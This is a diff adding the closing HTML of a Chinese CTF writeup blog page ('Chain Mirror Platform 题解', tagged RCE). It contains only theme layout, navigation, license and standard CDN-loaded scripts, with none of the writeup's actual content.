+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/" class="category-chain-item">CTF题解</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/Chain-Mirror/" class="category-chain-item">Chain Mirror</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Writeup/" class="print-no-link">#Writeup</a>
+      
+        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Chain Mirror Platform 题解</div>
+      <div>https://xendr1a.github.io/2026/04/02/chain-mirror/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/15/campus-2025/" title="校内招新赛 Web 题解">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">校内招新赛 Web 题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/20/buu/" title="BUUCTF Web 题解合集">
+                        <span class="hidden-mobile">BUUCTF Web 题解合集</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
